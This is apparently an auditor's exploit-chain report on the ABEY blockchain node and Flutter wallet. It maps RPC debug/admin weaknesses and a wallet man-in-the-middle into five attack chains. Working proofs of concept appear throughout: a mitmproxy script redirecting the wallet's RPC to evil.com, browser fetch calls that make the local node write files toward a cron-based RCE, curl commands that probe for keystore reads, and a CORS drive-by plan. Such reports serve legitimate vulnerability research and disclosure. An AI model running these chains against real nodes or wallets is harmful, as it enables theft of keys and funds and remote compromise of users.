# ABEY Cross-Side Wallet→Node Chain — CHAINER 2026-08-16

**Source:** `/tmp/abey_side_report/chain.md` (365 lines), go-abey 34 dirs + abey-wallet-module Flutter, 6 trust boundaries.
**Prior proven:** #1 `debug_writeMemProfile` arbitrary file write + #2 `debug_stacks/admin_datadir` info leak pre-auth when `admin,debug` exposed.

## Handoff Map

| H | Output A | Input B | Gate |
|---|---|---|---|
| H1 | `admin_datadir`/`debug_stacks` | `file` param for `ExportChain/ImportChain/TraceBlockFromFile` | `admin`/`debug` HTTP |
| H2 | `wallet Base_Url http://54.255.45.202:8010` MitM | `config['ABEY_RPC']` JSON injection | open WiFi / BGP |
| H3 | `debug_StartCPUProfile(file)` `os.Create(expandHome(file))` | `TraceBlockFromFile` read + cron persistence | writable path |
| H4 | `CORS *` / vhost IP bypass (`rpc/http.go:244`) | browser `fetch(127.0.0.1:8545, POST debug_*)` | `--http.corsdomain *` |
| H5 | `tracers/tracer.go:393 PevalString("("+code+")")` | `abey_sendAbeyRawTransaction` | `debug_traceTransaction` |

`abey/backend.go:362` `Public:false` only if `admin,debug` omitted from `--http.api`; `node/api.go:117 admin_StartRPC` can re-open with `cors=*` dynamically.

## Chain 1 — Wallet MitM → RPC Hijack → File-Write → RCE (65%)

**File anchors:** `lib/common/constant.dart:5` `Base_Url`, `lib/common/global.dart:141` `config['ABEY_RPC']`, `internal/debug/api.go:98` `StartCPUProfile`, `abey/api.go:328` `ExportChain`.

**Flow:** MitM `54.255.45.202:8010` (ARP/DNS, cleartext HTTP, `ISDEBUG=true`) → poison `{"ABEY_RPC":"{\"url\":\"http://evil.com:8545\"}"}` (no sig/allowlist) → wallet sends all RPC via attacker → WebView `common_webview.dart loadUrl(any)` → `fetch("http://127.0.0.1:8545", debug_startCPUProfile("/etc/cron.d/pwn"))` → cron RCE. `badCertificateCallback=>true` in `web3dart/core/client.dart` also enables TLS MitM.

**PoC (≤30 lines):**
```python
# mitmproxy
def response(flow):
    if "54.255.45.202:8010" in flow.request.url:
        flow.response.text = flow.response.text.replace("rpc.abeychain.com","evil.com:8545")
# victim wallet auto-switches; attacker RPC then injects into WebView:
# fetch('http://127.0.0.1:8545',{method:'POST',headers:{'Content-Type':'application/json'},
#  body:JSON.stringify({jsonrpc:'2.0',id:1,method:'debug_startCPUProfile',params:['/tmp/pwn']})})
```

## Chain 2 — stacks→datadir→keystore Read (80%/60%)

**Anchors:** `node/node.go:622` `debug.Handler` Public:true, `abey/api_tracer.go:383` `TraceBlockFromFile: ioutil.ReadFile(file)`, `abey/api.go:360` `ImportChain: os.Open(file)`.

**Flow:** `debug_stacks` (public) leaks goroutine paths → `admin_datadir` (if `admin` exposed) gives exact `$DATADIR` → `TraceBlockFromFile("/datadir/keystore/UTC--...")` reads via `os.Open`; `rlp.Decode` fails on JSON but error oracle leaks existence. Full dump needs symlink bypass `/tmp/link -> /datadir/keystore/file` then `TraceBlockFromFile("/tmp/link")` (no `Clean`+prefix check).

**PoC:**
```bash
DATADIR=$(curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"admin_datadir","params":[],"id":1}' http://127.0.0.1:8545 | jq -r .result)
curl -s -X POST -H "Content-Type: application/json" -d "{\"jsonrpc\":\"2.0\",\"method\":\"admin_importChain\",\"params\":[\"$DATADIR/keystore/$(ls $DATADIR/keystore|head -1)\"],\"id\":1}" http://127.0.0.1:8545
```

## Chain 3 — CORS*+debug Drive-by (90% if enabled, 40% live)

**Anchors:** `rpc/http.go:221` `newCorsHandler`, `rpc/http.go:244` `net.ParseIP(host)!=nil bypass`, `rpc/http.go:200` `validateRequest` `content-type==application/json`.

Drive-by `evil.com` → `fetch("http://127.0.0.1:8545", POST debug_writeMemProfile)` needs `HTTPCors=["*"]` (docs example uses `--http.corsdomain "*"`). IP `Host:127.0.0.1` bypasses `HTTPVirtualHosts`. `text/plain` form bypass blocked by mime check; alternative is WS upgrade (`WSOrigins` empty → allow all, no `Content-Type` check). `admin_startRPC(cors="*")` can inject `CORS *` if `admin` already exposed.

## Chain 4 — Impawn Staking → Committee (BUNTU 15%)

`cmd/impawn/impawn.go:49` `ImpawnAmount=20000` `deposit(pk,fee,value)` → `election/election.go: getElectionMembers()` stake-weighted. Permissionless by design; takeover needs >50% seats, not auth bypass. `abey/api.go:284 SetElection` is `PrivateMinerAPI` (needs `miner`).

## Chain 5 — JS Tracer Duktape (DoS only, 15% RCE)

`abey/tracers/tracer.go:310` `PevalString("("+code+")")` fallback + `abey/api_tracer.go:55 TraceConfig{Tracer}` → sandbox only `toHex,toWord,toAddress,toContract,isPrecompiled,slice,bigInt`; 5s timeout (`defaultTraceTimeout`). No `require/os/fs`. `callTracer` allowlist. Fuzz `duktape v3` (CE-2020-36478) needs ASAN; spam 100× `debug_traceTransaction` → CPU DoS via `runtime.NumCPU()` workers.

## Verification (clean install)

```bash
make -C /tmp/abey/go-abey gabey
rm -rf /tmp/abeytest && mkdir /tmp/abeytest && echo testtest>/tmp/pw.txt
/tmp/abey/go-abey/build/bin/gabey --datadir /tmp/abeytest account new --password /tmp/pw.txt
/tmp/abey/go-abey/build/bin/gabey --datadir /tmp/abeytest --http --http.addr 127.0.0.1 --http.port 8545 --http.api abey,eth,net,admin,debug --http.corsdomain "*" --http.vhosts "*" --allow-insecure-unlock --unlock 0 --password /tmp/pw.txt & sleep 6
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"debug_startCPUProfile","params":["/tmp/chain_verify"],"id":1}' http://127.0.0.1:8545; ls -lh /tmp/chain_verify
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"debug_stopCPUProfile","params":[],"id":1}' http://127.0.0.1:8545
pkill -f "abeytest.*gabey"
```

## Pitfalls

- Don't claim RCE from `debug_write*` — content is pprof binary; escalate only if writable cron/ssh/systemd + root or world-writable datadir.
- Don't claim full keystore exfil via `ImportChain` error — needs symlink proof.
- Wallet `ABEY_RPC` may be cached in `shared_preferences` (`preferences_util.dart`) — poison persists after MitM.
- Check live `rpc_modules` before claiming `singlenode` exposure — code `HTTPModules=[abey,eth,impawn,shh]` vs `defaultNodeConfig` + flags may differ from live `rpc.bchscan.io`.
